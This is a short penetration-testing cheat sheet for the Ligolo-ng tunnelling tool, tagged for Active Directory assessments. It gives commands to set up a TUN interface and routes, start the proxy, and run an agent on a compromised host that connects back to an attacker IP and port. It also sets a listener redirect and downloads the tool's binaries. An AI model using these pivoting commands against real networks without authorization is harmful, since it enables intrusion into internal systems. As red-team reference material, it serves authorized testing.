# Ligolo-ng

% ligolo-ng, pivot

## Setup TUN/TAP interface
#assessment/AD #attack_type/Pivot #port/11601 #protocol/tuntap #access/Anonymous

```bash
sudo ip tuntap add user $LOGNAME mode tun ligolo
sudo ip link set ligolo up
```

## Push routes
#assessment/AD #attack_type/Pivot #port/11601 #protocol/tuntap #access/Anonymous

```bash
sudo ip route add <route> dev ligolo
```

## Attacker IP exclusion
#assessment/AD #attack_type/Pivot #port/11601 #protocol/tuntap #access/Anonymous

```bash
sudo ip route add <attacker_ip>/32 dev <ethernet_interface>
```

## Proxy
#assessment/AD #attack_type/Pivot #port/11601 #protocol/tuntap #access/Anonymous

```bash
proxy -selfcert
```

## Agent
#assessment/AD #attack_type/Pivot #port/11601 #protocol/tuntap #access/Compromised_host

```bash
agent -ignore-cert -connect <attacker_ip>:<attacker_port>
```

## Agent listener & redirect
#assessment/AD #attack_type/Pivot #port/11601 #protocol/tuntap #access/Compromised_host

```bash
listener_add --addr 0.0.0.0:13000 --to 127.0.0.1:1234 --tcp 
```

## Download proxy
#assessment/AD #attack_type/Pivot #port/11601 #protocol/tuntap #access/Anonymous

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz -O - | tar xz && rm -rf LICENSE README.md
```

## Download agent
#assessment/AD #attack_type/Pivot #port/11601 #protocol/tuntap #access/Anonymous

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.tar.gz -O - | tar xz && rm -rf LICENSE README.md
```


= attacker_port: 11601
